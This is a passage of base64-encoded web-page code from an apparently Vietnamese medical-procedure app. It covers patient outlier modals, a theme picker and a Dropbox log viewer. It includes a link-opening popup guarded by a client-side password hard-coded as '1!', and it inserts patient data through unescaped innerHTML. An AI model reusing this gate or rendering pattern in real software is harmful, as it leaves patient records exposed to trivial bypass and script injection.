aXNwbGF5PSdibG9jayc7DQogICAgICBzdW1tYXJ5RGl2LmlubmVySFRNTCA9DQogICAgICAgIGA8YSBocmVmPSIjIiBpZD0iaGVyYk91dGxpZXJDb3VudExpbmsiPkPDsyAke291dGxpZXJzSW5WaWV3Lmxlbmd0aH0gY2EgY8OzIHbhuqVuIMSR4buBIHRyb25nIGRhbmggc8OhY2ggbsOgeS48L2E+YDsNCiAgICAgIGNvbnN0IGxpbmsgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnaGVyYk91dGxpZXJDb3VudExpbmsnKTsNCiAgICAgIGxpbmsuYWRkRXZlbnRMaXN0ZW5lcignY2xpY2snLCBmdW5jdGlvbihldil7DQogICAgICAgIGV2LnByZXZlbnREZWZhdWx0KCk7DQogICAgICAgIGlmKG1vZGFsQm9keSl7DQogICAgICAgICAgbW9kYWxCb2R5LmlubmVySFRNTCA9ICcnOw0KICAgICAgICAgIG91dGxpZXJzSW5WaWV3LmZvckVhY2gocD0+ew0KICAgICAgICAgICAgY29uc3QgdHIgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCd0cicpOw0KICAgICAgICAgICAgdHIuaW5uZXJIVE1MID0gYA0KICAgICAgICAgICAgICA8dGQ+JHtwLnBhdGllbnROYW1lfTwvdGQ+DQogICAgICAgICAgICAgIDx0ZD4ke3AucHJvY2VkdXJlfTwvdGQ+DQogICAgICAgICAgICAgIDx0ZD4ke3AuZGF0ZX08L3RkPg0KICAgICAgICAgICAgICA8dGQ+JHtwLmRpc3BsYXlTdGFydH0gJnJhcnI7ICR7cC5kaXNwbGF5RW5kfTwvdGQ+DQogICAgICAgICAgICAgIDx0ZD4ke3Aub3BDbGVhbn08L3RkPg0KICAgICAgICAgICAgYDsNCiAgICAgICAgICAgIG1vZGFsQm9keS5hcHBlbmRDaGlsZCh0cik7DQogICAgICAgICAgfSk7DQogICAgICAgIH0NCiAgICAgICAgaWYobW9kYWxJbmZvKXsNCiAgICAgICAgICBjb25zdCBub3RlRGF0ZSA9IChzZWxlY3RlZERhdGU9PT0nYWxsJykgPyAnbmhp4buBdSBuZ8OgeScgOiBzZWxlY3RlZERhdGU7DQogICAgICAgICAgbW9kYWxJbmZvLnRleHRDb250ZW50ID0gYFThu5VuZyAke291dGxpZXJzSW5WaWV3Lmxlbmd0aH0gY2Ega2jDoWMgxJFhIHPhu5EgKCR7bm90ZURhdGV9KS5gOw0KICAgICAgICB9DQogICAgICAgIGlmKG1vZGFsKSBtb2RhbC5zdHlsZS5kaXNwbGF5PSdibG9jayc7DQogICAgICB9LCB7b25jZTp0cnVlfSk7DQogICAgfSBlbHNlIHsNCiAgICAgIHN1bW1hcnlEaXYuc3R5bGUuZGlzcGxheT0nbm9uZSc7DQogICAgICBzdW1tYXJ5RGl2LmlubmVySFRNTD0nJzsNCiAgICB9DQogIH0NCn07DQoNCg0KICBkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCdET01Db250ZW50TG9hZGVkJywgKCk9PnsNCiAgICBjb25zdCB0YWJsZSA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdoZXJiUHJvY2VkdXJlVGFibGUnKTsNCiAgICBpZih0YWJsZSAmJiB0YWJsZS5zdHlsZS5kaXNwbGF5ICE9PSAnbm9uZScpew0KICAgICAgd2luZG93LnJlbmRlckhlcmJMaXN0KCk7DQogICAgfQ0KICB9KTsNCn0pKCk7DQoNCg0KDQoNCjwvc2NyaXB0Pg0KPHNjcmlwdD4NCiAgZG9jdW1lbnQuYWRkRXZlbnRMaXN0ZW5lcigiRE9NQ29udGVudExvYWRlZCIsIGZ1bmN0aW9uICgpIHsNCiAgICBjb25zdCBmaWxlSW5wdXQgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZmlsZUlucHV0Jyk7DQogICAgY29uc3QgYW5hbHl6ZUJ0biA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdhbmFseXplQnRuJyk7DQogICAgaWYgKGZpbGVJbnB1dCAmJiBhbmFseXplQnRuKSB7DQogICAgICBmaWxlSW5wdXQuYWRkRXZlbnRMaXN0ZW5lcignY2hhbmdlJywgZnVuY3Rpb24gKCkgew0KICAgICAgICBhbmFseXplQnRuLmNsaWNrKCk7DQogICAgICB9KTsNCiAgICB9DQogIH0pOw0KPC9zY3JpcHQ+DQoNCg0KPCEtLSBUSEVNRSBQSUNLRVIgU0NSSVBUIC0tPg0KPHNjcmlwdD4NCihmdW5jdGlvbigpew0KICBjb25zdCBUSEVNRV9LRVkgPSAndWlBY2NlbnRUaGVtZSc7DQogIGNvbnN0IGJvZHkgPSBkb2N1bWVudC5ib2R5Ow0KICBjb25zdCBwaWNrZXIgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgndGhlbWVQaWNrZXInKTsNCiAgaWYoIXBpY2tlcikgcmV0dXJuOw0KICBmdW5jdGlvbiBhcHBseVRoZW1lKHQpew0KICAgIGJvZHkuY2xhc3NMaXN0LnJlbW92ZSgndGhlbWUtZGVmYXVsdCcsJ3RoZW1lLW9yYW5nZScsJ3RoZW1lLXJlZCcsJ3RoZW1lLWdyZWVuJyk7DQogICAgaWYodCAmJiB0ICE9PSAnZGVmYXVsdCcpew0KICAgICAgYm9keS5jbGFzc0xpc3QuYWRkKCd0aGVtZS0nK3QpOw0KICAgIH0gZWxzZSB7DQogICAgICBib2R5LmNsYXNzTGlzdC5hZGQoJ3RoZW1lLWRlZmF1bHQnKTsgLy8gZXhwbGljaXQgxJHhu4MgYWN0aXZlIHJpbmcNCiAgICB9DQogICAgcGlja2VyLnF1ZXJ5U2VsZWN0b3JBbGwoJy50aGVtZS1zd2F0Y2gnKS5mb3JFYWNoKGJ0bj0+ew0KICAgICAgYnRuLmNsYXNzTGlzdC50b2dnbGUoJ2lzLWFjdGl2ZScsIGJ0bi5kYXRhc2V0LnRoZW1lPT09dCB8fCAodD09PScnICYmIGJ0bi5kYXRhc2V0LnRoZW1lPT09J2RlZmF1bHQnKSk7DQogICAgfSk7DQogICAgdHJ5eyBsb2NhbFN0b3JhZ2Uuc2V0SXRlbShUSEVNRV9LRVksdHx8J2RlZmF1bHQnKTsgfWNhdGNoKGUpe30NCiAgfQ0KICBjb25zdCBzYXZlZCA9IChmdW5jdGlvbigpe3RyeXtyZXR1cm4gbG9jYWxTdG9yYWdlLmdldEl0ZW0oVEhFTUVfS0VZKSB8fCAnZGVmYXVsdCc7fWNhdGNoKGUpe3JldHVybiAnZGVmYXVsdCc7fX0pKCk7DQogIGFwcGx5VGhlbWUoc2F2ZWQpOw0KICBwaWNrZXIuYWRkRXZlbnRMaXN0ZW5lcignY2xpY2snLGU9PnsNCiAgICBjb25zdCBidG4gPSBlLnRhcmdldC5jbG9zZXN0KCcudGhlbWUtc3dhdGNoJyk7DQogICAgaWYoIWJ0bikgcmV0dXJuOw0KICAgIGFwcGx5VGhlbWUoYnRuLmRhdGFzZXQudGhlbWUpOw0KICB9KTsNCn0pKCk7DQo8L3NjcmlwdD4NCg0KPHNjcmlwdD4NCmZ1bmN0aW9uIHVwZGF0ZUhlcmJCdXR0b25XaXRoT3V0bGllckNvdW50KCkgew0KICBjb25zdCBidG4gPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnaGVyYlRvZ2dsZUJ0bicpOw0KICBpZiAoIWJ0biB8fCAhd2luZG93LmFsbEhlcmJQcm9jZWR1cmVzKSByZXR1cm47DQoNCiAgY29uc3QgaGVyYnMgPSB3aW5kb3cuYWxsSGVyYlByb2NlZHVyZXM7DQogIGNvbnN0IGNvdW50cyA9IHt9Ow0KDQogIGhlcmJzLmZvckVhY2goaCA9PiB7DQogICAgY29uc3QgZGF0ZSA9IGguZGF0ZTsNCiAgICBjb25zdCBrZXkgPSBkYXRlOw0KICAgIGlmICghY291bnRzW2tleV0pIGNvdW50c1trZXldID0ge307DQogICAgY29uc3QgbmFtZSA9IChoLm9wZXJhdG9yIHx8ICdLaMO0bmcgY8OzJykudHJpbSgpLnRvTG93ZXJDYXNlKCk7DQogICAgY291bnRzW2tleV1bbmFtZV0gPSAoY291bnRzW2tleV1bbmFtZV0gfHwgMCkgKyAxOw0KICB9KTsNCg0KICBsZXQgb3V0bGllckNvdW50ID0gMDsNCg0KICBPYmplY3Qua2V5cyhjb3VudHMpLmZvckVhY2goZGF0ZSA9PiB7DQogICAgY29uc3Qgb3BzID0gY291bnRzW2RhdGVdOw0KICAgIGNvbnN0IGVudHJpZXMgPSBPYmplY3QuZW50cmllcyhvcHMpLnNvcnQoKGEsIGIpID0+IGJbMV0gLSBhWzFdKTsNCiAgICBjb25zdCB0b3AgPSBlbnRyaWVzWzBdOw0KICAgIGlmICghdG9wKSByZXR1cm47DQoNCiAgICBjb25zdCB0b3BOYW1lID0gdG9wWzBdOw0KICAgIGNvbnN0IHRvcENvdW50ID0gdG9wWzFdOw0KDQogICAgZm9yIChjb25zdCBbbmFtZSwgY291bnRdIG9mIGVudHJpZXMpIHsNCiAgICAgIGlmIChuYW1lICE9PSB0b3BOYW1lICYmIGNvdW50ID4gMCkgew0KICAgICAgICBvdXRsaWVyQ291bnQgKz0gY291bnQ7DQogICAgICB9DQogICAgfQ0KICB9KTsNCg0KYnRuLmlubmVySFRNTCA9IGBT4bqvYyB0aHXhu5FjIHRoYW5nIDxpIGNsYXNzPSJmYS1zb2xpZCBmYS10cmlhbmdsZS1leGNsYW1hdGlvbiIgc3R5bGU9ImNvbG9yOnllbGxvdyI+PC9pPiA8c3BhbiBzdHlsZT0iY29sb3I6eWVsbG93OyBmb250LXdlaWdodDpib2xkIj4oJHtvdXRsaWVyQ291bnR9KTwvc3Bhbj5gOw0KDQoNCn0NCjwvc2NyaXB0Pg0KPGRpdiBpZD0iZHJvcGJveFBhbmVsIiBzdHlsZT0iZGlzcGxheTpub25lOyBwb3NpdGlvbjpmaXhlZDsgaW5zZXQ6MDsgYmFja2dyb3VuZDpyZ2JhKDAsMCwwLDAuNSk7IHotaW5kZXg6OTk5OTsiPg0KICA8ZGl2IHN0eWxlPSJtYXJnaW46NSUgYXV0bzsgYmFja2dyb3VuZDojZmZmOyBwYWRkaW5nOjIwcHg7IG1heC13aWR0aDo5MCU7IGJvcmRlci1yYWRpdXM6MTBweDsgbWF4LWhlaWdodDo4MHZoOyBvdmVyZmxvdzphdXRvIj4NCiAgIDxkaXYgc3R5bGU9ImRpc3BsYXk6IGZsZXg7IGp1c3RpZnktY29udGVudDogc3BhY2UtYmV0d2VlbjsgYWxpZ24taXRlbXM6IGNlbnRlcjsiPg0KICA8aDM+8J+TgiBEYW5oIHPDoWNoIEtob2EgxJHDoyBz4butIGThu6VuZyBwaOG6p24gbeG7gW08L2gzPg0KICA8YnV0dG9uIGNsYXNzPSJidG4ib25jbGljaz0iZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2Ryb3Bib3hQYW5lbCcpLnN0eWxlLmRpc3BsYXk9J25vbmUnInN0eWxlPSJwYWRkaW5nOjhweCAxNHB4OyBmb250LXNpemU6MTNweDsgYm9yZGVyLXJhZGl1czo0cHg7Ij4NCiAgICDEkMOzbmcNCiAgPC9idXR0b24+DQo8L2Rpdj4NCjwhLS0gUGFnaW5hdGlvbiBjb250cm9scyAtLT4NCjxkaXYgaWQ9ImRyb3Bib3hQYWdlciIgc3R5bGU9ImRpc3BsYXk6ZmxleDthbGlnbi1pdGVtczpjZW50ZXI7Z2FwOjhweDtqdXN0aWZ5LWNvbnRlbnQ6c3BhY2UtYmV0d2VlbjttYXJnaW4tdG9wOjEycHgiPg0KICA8ZGl2Pg0KICAgIEhp4buDbiB0aOG7iw0KICAgIDxzZWxlY3QgaWQ9ImRyb3Bib3hQYWdlU2l6ZSIgc3R5bGU9InBhZGRpbmc6NnB4IDhweDtib3JkZXI6MXB4IHNvbGlkICNkZGQ7Ym9yZGVyLXJhZGl1czo2cHgiPg0KICAgICAgPG9wdGlvbiB2YWx1ZT0iMTAiIHNlbGVjdGVkPjEwPC9vcHRpb24+DQogICAgICA8b3B0aW9uIHZhbHVlPSIyMCI+MjA8L29wdGlvbj4NCiAgICAgIDxvcHRpb24gdmFsdWU9IjUwIj41MDwvb3B0aW9uPg0KICAgIDwvc2VsZWN0Pg0KICAgIGTDsm5nIC8gdHJhbmcNCiAgPC9kaXY+DQoNCiAgPGRpdiBpZD0iZHJvcGJveFBhZ2VCdXR0b25zIiBzdHlsZT0iZGlzcGxheTpmbGV4O2dhcDo2cHg7ZmxleC13cmFwOndyYXAiPjwvZGl2Pg0KDQogIDxkaXYgaWQ9ImRyb3Bib3hQYWdlSW5mbyIgc3R5bGU9Im1pbi13aWR0aDoxNzBweDt0ZXh0LWFsaWduOnJpZ2h0Ij48L2Rpdj4NCjwvZGl2Pg0KICAgIDx0YWJsZSBib3JkZXI9IjEiIGNlbGxwYWRkaW5nPSI4IiBzdHlsZT0id2lkdGg6MTAwJTsgYm9yZGVyLWNvbGxhcHNlOmNvbGxhcHNlOyBmb250LXNpemU6MTRweCI+DQogICAgICA8dGhlYWQ+DQogICAgICAgIDx0cj4NCiAgICAgICAgICA8dGg+U1RUPC90aD4NCiAgICAgICAgICA8dGg+VMOqbiBraG9hPC90aD4NCiAgICAgICAgICA8dGg+TmfDoHk8L3RoPg0KICAgICAgICAgIDx0aD5T4bqvYyB0aHXhu5FjPC90aD4NCiAgICAgICAgIDx0aD5TYWkgdGjhu51pIGdpYW48L3RoPg0KICAgICAgIDx0aD5UcsO5bmcgZ2nhu508L3RoPg0KICAgICAgIA0KICAgICAgICAgIDx0aD5UaOG7nWkgZ2lhbjwvdGg+DQoJCSAgPHRoPkxpbms8L3RoPg0KCQkgIDx0aD5Yb8OhPC90aD4NCiAgICAgICAgPC90cj4NCiAgICAgIDwvdGhlYWQ+DQogICAgICA8dGJvZHkgaWQ9ImRyb3Bib3hGaWxlTGlzdCI+PC90Ym9keT4NCiAgICA8L3RhYmxlPg0KICANCiAgPC9kaXY+DQo8L2Rpdj48c2NyaXB0Pg0KYXN5bmMgZnVuY3Rpb24gc2hvd0Ryb3Bib3hQYW5lbCgpIHsNCmF3YWl0IGVuc3VyZURyb3Bib3goKTsgLy8gxJHhuqNtIGLhuqNvIGPDsyBEcm9wYm94IFNESw0KDQogIGNvbnN0IGFjY2Vzc1Rva2VuID0gYXdhaXQgZ2V0QWNjZXNzVG9rZW4oKTsNCiAgY29uc3QgZGJ4ID0gbmV3IERyb3Bib3guRHJvcGJveCh7IGFjY2Vzc1Rva2VuIH0pOw0KICBjb25zdCB0Ym9keSA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdkcm9wYm94RmlsZUxpc3QnKTsNCg0KICAvLyBIaeG7h24gcG9wdXAgbmdheSBs4bqtcCB04bupYyB24bubaSB0cuG6oW5nIHRow6FpIGxvYWRpbmcNCiAgdGJvZHkuaW5uZXJIVE1MID0gYDx0cj48dGQgY29sc3Bhbj0iOSIgc3R5bGU9InRleHQtYWxpZ246Y2VudGVyOyBjb2xvcjpibHVlOyI+DQogICAgxJBhbmcgdOG6o2kgZOG7ryBsaeG7h3UuLi4NCiAgPC90ZD48L3RyPmA7DQogIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdkcm9wYm94UGFuZWwnKS5zdHlsZS5kaXNwbGF5ID0gJ2Jsb2NrJzsNCg0KICB0cnkgew0KICAgIC8vIDEpIEtp4buDbSB0cmEgdOG7k24gdOG6oWkgbG9nLmpzb24NCiAgICBsZXQgaGFzTG9nID0gZmFsc2U7DQogICAgbGV0IHJlcyA9IGF3YWl0IGRieC5maWxlc0xpc3RGb2xkZXIoeyBwYXRoOiAnL3RodXRodWF0JyB9KTsNCiAgICB3aGlsZSAodHJ1ZSkgew0KICAgICAgaWYgKHJlcy5yZXN1bHQ/LmVudHJpZXM/LnNvbWUoZSA9PiBlWycudGFnJ10gPT09ICdmaWxlJyAmJiBlLm5hbWUgPT09ICdsb2cuanNvbicpKSB7DQogICAgICAgIGhhc0xvZyA9IHRydWU7DQogICAgICAgIGJyZWFrOw0KICAgICAgfQ0KICAgICAgaWYgKCFyZXMucmVzdWx0Py5oYXNfbW9yZSkgYnJlYWs7DQogICAgICByZXMgPSBhd2FpdCBkYnguZmlsZXNMaXN0Rm9sZGVyQ29udGludWUoeyBjdXJzb3I6IHJlcy5yZXN1bHQuY3Vyc29yIH0pOw0KICAgIH0NCg0KICAgIC8vIDIpIE7hur91IGtow7RuZyBjw7MgZmlsZSDihpIgY+G6rXAgbmjhuq10IG7hu5lpIGR1bmcNCiAgICBpZiAoIWhhc0xvZykgew0KICAgICAgdGJvZHkuaW5uZXJIVE1MID0gYDx0cj48dGQgY29sc3Bhbj0iNiIgc3R5bGU9InRleHQtYWxpZ246Y2VudGVyOyBjb2xvcjpyZWQ7Ij4NCiAgICAgICAgS2jDtG5nIGPDsyBkYW5oIHPDoWNoIG7DoG8gxJHGsOG7o2MgbMawdQ0KICAgICAgPC90ZD48L3RyPmA7DQogICAgICByZXR1cm47DQogICAgfQ0KDQogICAgLy8gMykgQ8OzIGZpbGUg4oaSIHThuqNpIHbDoCBoaeG7g24gdGjhu4sNCiAgICBjb25zdCBkbCA9IGF3YWl0IGRieC5maWxlc0Rvd25sb2FkKHsgcGF0aDogJy90aHV0aHVhdC9sb2cuanNvbicgfSk7DQogICAgY29uc3QgdGV4dCA9IGF3YWl0IGRsLnJlc3VsdC5maWxlQmxvYi50ZXh0KCk7DQogICAgbGV0IGxvZ3MgPSBbXTsNCiAgICB0cnkgeyBsb2dzID0gSlNPTi5wYXJzZSh0ZXh0KTsgfSBjYXRjaCB7IGxvZ3MgPSBbXTsgfQ0KDQogICAgaWYgKCFsb2dzLmxlbmd0aCkgew0KICAgICAgdGJvZHkuaW5uZXJIVE1MID0gYDx0cj48dGQgY29sc3Bhbj0iNiIgc3R5bGU9InRleHQtYWxpZ246Y2VudGVyOyBjb2xvcjpyZWQ7Ij4NCiAgICAgICAgS2jDtG5nIGPDsyBkYW5oIHPDoWNoIG7DoG8gxJHGsOG7o2MgbMawdQ0KICAgICAgPC90ZD48L3RyPmA7DQogICAgfSBlbHNlIHsNCiBjb25zdCBjdXJyZW50VXNlciA9IChzZXNzaW9uU3RvcmFnZS5nZXRJdGVtKCdtZWRVc2VyJykgfHwgJycpLnRvTG93ZXJDYXNlKCk7DQoNCi8vIFJlbmRlciBt4bubaSDigJMgZ2lhbyBjaG8gYuG7mSBwaMOibiB0cmFuZzoNCkRCX0xPR1MgPSBsb2dzOyAvLyBt4bqjbmcgZOG7ryBsaeG7h3UgxJHhuqd5IMSR4bunDQpEQl9QQUdFID0gMTsgICAgLy8gduG7gSB0cmFuZyAxIG3hu5dpIGtoaSBt4bufIHBhbmVsDQpEQl9DVVJSRU5UX1VTRVIgPSAoc2Vzc2lvblN0b3JhZ2UuZ2V0SXRlbSgnbWVkVXNlcicpIHx8ICcnKS50b0xvd2VyQ2FzZSgpOw0KDQphdHRhY2hQYWdlckV2ZW50c09uY2UoKTsgLy8gZ+G6r24gY2hhbmdlIGNobyBzZWxlY3QgcGFnZSBzaXplIChjaOG7iSAxIGzhuqduKQ0KcmVuZGVyRHJvcGJveFBhZ2UoKTsgICAgIC8vIHbhur0gdGJvZHkgKyBuw7p0IHRyYW5nIHThu6sgREJfTE9HUw0KICAgIH0NCiAgfSBjYXRjaCAoZXJyKSB7DQogICAgY29uc29sZS5lcnJvcignTOG7l2kga2hpIMSR4buNYyBkYW5oIHPDoWNoIHThu6sgRHJvcGJveDonLCBlcnIpOw0KICAgIHRib2R5LmlubmVySFRNTCA9IGA8dHI+PHRkIGNvbHNwYW49IjYiIHN0eWxlPSJ0ZXh0LWFsaWduOmNlbnRlcjsgY29sb3I6cmVkOyI+DQogICAgICBLaMO0bmcgdGjhu4MgdOG6o2kgZOG7ryBsaeG7h3UNCiAgICA8L3RkPjwvdHI+YDsNCiAgfQ0KfQ0KKGZ1bmN0aW9uKCl7DQogIGNvbnN0IHBhZ2VyID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2Ryb3Bib3hQYWdlcicpOw0KICBpZiAocGFnZXIgJiYgIXBhZ2VyLmRhdGFzZXQuYm91bmQpIHsNCiAgICBwYWdlci5kYXRhc2V0LmJvdW5kID0gJzEnOw0KICAgIHBhZ2VyLmFkZEV2ZW50TGlzdGVuZXIoJ2NsaWNrJywgZSA9PiBlLnN0b3BQcm9wYWdhdGlvbigpKTsNCiAgICBwYWdlci5hZGRFdmVudExpc3RlbmVyKCdtb3VzZWRvd24nLCBlID0+IGUuc3RvcFByb3BhZ2F0aW9uKCkpOw0KICB9DQp9KSgpOw0KDQo8L3NjcmlwdD4NCjxzY3JpcHQ+DQpmdW5jdGlvbiB2ZXJpZnlBbmRPcGVuTGluayh1cmwpIHsNCg0KDQogIC8vIE92ZXJsYXkgdOG7kWkgKGNsaWNrIHbDoG8gc+G6vSB04bqvdCkNCiAgY29uc3Qgb3ZlcmxheSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2RpdicpOw0KICBPYmplY3QuYXNzaWduKG92ZXJsYXkuc3R5bGUsIHsNCiAgICBwb3NpdGlvbjogJ2ZpeGVkJywgaW5zZXQ6ICcwJywgYmFja2dyb3VuZDogJ3JnYmEoMCwwLDAsMC41KScsDQogICAgZGlzcGxheTogJ2ZsZXgnLCBqdXN0aWZ5Q29udGVudDogJ2NlbnRlcicsIGFsaWduSXRlbXM6ICdjZW50ZXInLA0KICAgIHpJbmRleDogJzEwMDAwJw0KICB9KTsNCg0KICAvLyBLaHVuZyBwb3B1cA0KICBjb25zdCBib3ggPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdkaXYnKTsNCiAgT2JqZWN0LmFzc2lnbihib3guc3R5bGUsIHsNCiAgICBiYWNrZ3JvdW5kOiAnI2ZmZicsIHBhZGRpbmc6ICcyNHB4JywgYm9yZGVyUmFkaXVzOiAnMTBweCcsDQogICAgbWF4V2lkdGg6ICc0MjBweCcsIHdpZHRoOiAnOTAlJywgYm94U2hhZG93OiAnMCA0cHggMTBweCByZ2JhKDAsMCwwLDAuMyknLA0KICAgIGRpc3BsYXk6ICdmbGV4JywgZmxleERpcmVjdGlvbjogJ2NvbHVtbicsIGFsaWduSXRlbXM6ICdjZW50ZXInLCBnYXA6ICcxMnB4Jw0KICB9KTsNCg0KICAvLyBUacOqdSDEkeG7gSBuZ+G6r24gZ+G7jW4gKGtow7RuZyBjw7MgaWNvbi9n4butaSBk4buvIGxp4buHdSkNCiAgY29uc3QgdGl0bGUgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdkaXYnKTsNCiAgdGl0bGUudGV4dENvbnRlbnQgPSAnTmjhuq1wIG3huq10IGto4bqpdSDEkeG7gyBt4bufIGxpbmsnOw0KICB0aXRsZS5zdHlsZS5mb250V2VpZ2h0ID0gJzYwMCc7DQoNCiAgLy8gw5Qgbmjhuq1wIG3huq10IGto4bqpdQ0KICBjb25zdCBpbnB1dCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2lucHV0Jyk7DQogIE9iamVjdC5hc3NpZ24oaW5wdXQsIHsgdHlwZTogJ3Bhc3N3b3JkJywgcGxhY2Vob2xkZXI6ICdN4bqtdCBraOG6qXUnIH0pOw0KICBPYmplY3QuYXNzaWduKGlucHV0LnN0eWxlLCB7DQogICAgcGFkZGluZzogJzEwcHgnLCB3aWR0aDogJzEwMCUnLCBib3JkZXI6ICcxcHggc29saWQgI2RkZCcsIGJvcmRlclJhZGl1czogJzZweCcNCiAgfSk7DQoNCiAgLy8gVGjDtG5nIGLDoW8gbOG7l2kgKOG6qW4gbeG6t2MgxJHhu4tuaCkNCiAgY29uc3QgZXJyID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnZGl2Jyk7DQogIGVyci50ZXh0Q29udGVudCA9ICfinYwgU2FpIG3huq10IGto4bqpdSEnOw0KICBPYmplY3QuYXNzaWduKGVyci5zdHlsZSwgeyBjb2xvcjogJ3JlZCcsIGZvbnRTaXplOiAnMTRweCcsIGRpc3BsYXk6ICdub25lJyB9KTsNCg0KICAvLyBOw7p0IHjDoWMgbmjhuq1uDQogIGNvbnN0IGJ0biA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2J1dHRvbicpOw0KICBidG4udGV4dENvbnRlbnQgPSAnWMOhYyBuaOG6rW4nOw0KICBPYmplY3QuYXNzaWduKGJ0bi5zdHlsZSwgew0KICAgIHBhZGRpbmc6ICcxMHB4IDE2cHgnLCBiYWNrZ3JvdW5kOiAnIzM0OThkYicsIGNvbG9yOiAnI2ZmZicsDQogICAgYm9yZGVyOiAnbm9uZScsIGJvcmRlclJhZGl1czogJzZweCcsIGN1cnNvcjogJ3BvaW50ZXInDQogIH0pOw0KDQogIC8vIFByb2dyZXNzIGJhciAoxJHhurd0IETGr+G7mkkgQ8OZTkcpDQogIGNvbnN0IGJhcldyYXAgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdkaXYnKTsNCiAgT2JqZWN0LmFzc2lnbihiYXJXcmFwLnN0eWxlLCB7DQogICAgd2lkdGg6ICcxMDAlJywgYmFja2dyb3VuZDogJyNkZGQnLCBoZWlnaHQ6ICc2cHgnLA0KICAgIGJvcmRlclJhZGl1czogJzNweCcsIG1hcmdpblRvcDogJzEycHgnDQogIH0pOw0KICBjb25zdCBiYXIgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdkaXYnKTsNCiAgT2JqZWN0LmFzc2lnbihiYXIuc3R5bGUsIHsgd2lkdGg6ICcwJScsIGhlaWdodDogJzEwMCUnLCBiYWNrZ3JvdW5kOiAnIzM0OThkYicgfSk7DQogIGJhcldyYXAuYXBwZW5kQ2hpbGQoYmFyKTsNCg0KICAvLyBH4bqvbiB2w6BvIERPTQ0KICBib3guYXBwZW5kQ2hpbGQodGl0bGUpOw0KICBib3guYXBwZW5kQ2hpbGQoaW5wdXQpOw0KICBib3guYXBwZW5kQ2hpbGQoZXJyKTsNCiAgYm94LmFwcGVuZENoaWxkKGJ0bik7DQogIGJveC5hcHBlbmRDaGlsZChiYXJXcmFwKTsNCiAgb3ZlcmxheS5hcHBlbmRDaGlsZChib3gpOw0KICBkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKG92ZXJsYXkpOw0KDQogIC8vIENo4bq3biBjbGljayBiw6puIHRyb25nIGtow7RuZyDEkcOzbmcNCiAgYm94LmFkZEV2ZW50TGlzdGVuZXIoJ2NsaWNrJywgZSA9PiBlLnN0b3BQcm9wYWdhdGlvbigpKTsNCiAgLy8gQ2xpY2sgcmEgbmdvw6BpIMSR4buDIHThuq90DQogIG92ZXJsYXkuYWRkRXZlbnRMaXN0ZW5lcignY2xpY2snLCAoKSA9PiB7DQogICAgZG9jdW1lbnQuYm9keS5yZW1vdmVDaGlsZChvdmVybGF5KTsNCiAgfSk7DQoNCiAgLy8gWOG7rSBsw70geMOhYyBuaOG6rW4NCiAgYXN5bmMgZnVuY3Rpb24gc3VibWl0KCkgew0KICAgIC8vIMSQ4buVaSBt4bqtdCBraOG6qXUg4bufIMSRw6J5DQogICAgY29uc3QgT0sgPSBpbnB1dC52YWx1ZSA9PT0gJzEhJzsNCg0KICAgIGlmICghT0spIHsNCiAgICAgIGVyci5zdHlsZS5kaXNwbGF5ID0gJ2Jsb2NrJzsNCiAgICAgIHJldHVybjsNCiAgICB9DQogICAgZXJyLnN0eWxlLmRpc3BsYXkgPSAnbm9uZSc7DQogICAgYnRuLmRpc2FibGVkID0gdHJ1ZTsNCiAgICBpbnB1dC5kaXNhYmxlZCA9IHRydWU7DQoNCiAgICAvLyBBbmltYXRlIHByb2dyZXNzIG5oYW5oIGzDqm4gMTAwJQ0KICAgIGJhci5zdHlsZS50cmFuc2l0aW9uID0gJ3dpZHRoIDAuNnMgZWFzZSc7DQogICAgcmVxdWVzdEFuaW1hdGlvbkZyYW1lKCgpID0+IChiYXIuc3R5bGUud2lkdGggPSAnMTAwJScpKTsNCiAgICBzZXRUaW1lb3V0KCgpID0+IHsNCiAgICAgIHdpbmRvdy5vcGVuKHVybCwgJ19ibGFuaycpOw0KICAgICAgaWYgKG92ZXJsYXkucGFyZW50Tm9kZSkgZG9jdW1lbnQuYm9keS5yZW1vdmVDaGlsZChvdmVybGF5KTsNCiAgICB9LCA2NTApOw0KICB9DQoNCiAgYnRuLmFkZEV2ZW50TGlzdGVuZXIoJ2NsaWNrJywgc3VibWl0KTsNCiAgaW5wdXQuYWRkRXZlbnRMaXN0ZW5lcigna2V5ZG93bicsIChlKSA9PiB7DQogICAgaWYgKGUua2V5ID09PSAnRW50ZXInKSBzdWJtaXQoKTsNCiAgfSk7DQoNCiAgLy8gRm9jdXMgbmdheSDDtCBt4bqtdCBraOG6qXUNCiAgc2V0VGltZW91dCgoKSA9PiBpbnB1dC5mb2N1cygpLCAwKTsNCn0NCg0KZnVuY3Rpb24gZXh0cmFjdEZpbGVuYW1lKGRyb3Bib3hQcmV2aWV3VXJsKSB7DQogIHRyeSB7DQogICAgY29uc3QgdSA9IG5ldyBVUkwoZHJvcGJveFByZXZpZXdVcmwpOw0KICAgIGNvbnN0IHAgPSB1LnNlYXJjaFBhcmFtcy5nZXQoJ3ByZXZpZXcnKTsNCiAgICByZXR1cm4gZGVjb2RlVVJJQ29tcG9uZW50KHAgfHwgJycpOw0KICB9IGNhdGNoIHsgcmV0dXJuICcnOyB9DQp9DQoNCi8vIEjhu5lwIHjDoWMgbmjhuq1uIHhvw6EgKHRy4bqjIHbhu4EgUHJvbWlzZTxib29sZWFuPikNCmZ1bmN0aW9uIGNvbmZpcm1EZWxldGVQb3B1cCh0